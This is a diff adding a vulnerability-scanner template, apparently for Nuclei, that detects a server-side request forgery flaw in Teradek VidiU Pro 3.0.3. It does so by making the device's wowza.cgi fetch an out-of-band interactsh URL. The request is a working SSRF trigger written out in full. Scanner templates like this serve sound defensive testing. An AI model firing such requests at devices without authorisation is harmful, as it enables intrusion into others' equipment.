@@ -1,0 +1,22 @@
+id: teradek-vidiu-ssrf
+
+info:
+  name: Teradek VidiU Pro 3.0.3 - Server-Side Request Forgery
+  author: 0x_Akoko
+  severity: medium
+  description: A server-side request forgery (SSRF) vulnerability exists in the VidiU management interface within the RTMP settings and the Wowza server mode functionality
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5461.php
+    - https://packetstormsecurity.com/files/147725
+  tags: ssrf,teradek
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/cgi-bin/wowza.cgi?command=read_url&url={{interactsh-url}}&_=1526243349301'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
